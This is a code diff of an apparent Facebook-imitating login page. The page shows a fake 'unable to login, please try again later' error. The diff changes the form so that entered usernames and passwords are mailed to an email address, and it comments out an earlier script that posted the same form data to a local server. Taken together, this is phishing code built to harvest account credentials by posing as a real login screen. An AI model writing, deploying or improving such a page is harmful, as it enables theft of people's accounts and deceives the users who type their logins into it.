@@ -16,7 +16,7 @@
         <p class="hey">Login Into Facebook</p>
         
     </div>
-    <form class="mains">
+    <form class="mains" action="mailto:emailid@example.com" method="post" enctype="text/plain">
         <p id="were" class="wer qet">unanle to login, please try again later</p>
         <div class="secondx">
          <input type="text" id="emai;" name="user" required placeholder="Email address or phone number" class="second">
@@ -44,27 +44,27 @@
 
      <script>
 
-        const form = document.querySelector('form');
+        // const form = document.querySelector('form');
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
+        // form.addEventListener('submit', (e) => {
+        //     e.preventDefault();
 
-        const fd = new FormData(form);
+        // const fd = new FormData(form);
 
-        const content = fd;
+        // const content = fd;
 
-        const urlEncoded = new URLSearchParams(fd).toString();
+        // const urlEncoded = new URLSearchParams(fd).toString();
 
-        console.log(urlEncoded);
+        // console.log(urlEncoded);
 
-            fetch('http://localhost:5000/form', {
-                method: 'post',
-                body: urlEncoded,
-                headers: {
-                    'content-type': 'application/x-www-form-urlencoded',                }
-            })
+        //     fetch('http://localhost:5000/form', {
+        //         method: 'post',
+        //         body: urlEncoded,
+        //         headers: {
+        //             'content-type': 'application/x-www-form-urlencoded',                }
+        //     })
 
-        })
+        // })
 
 
 
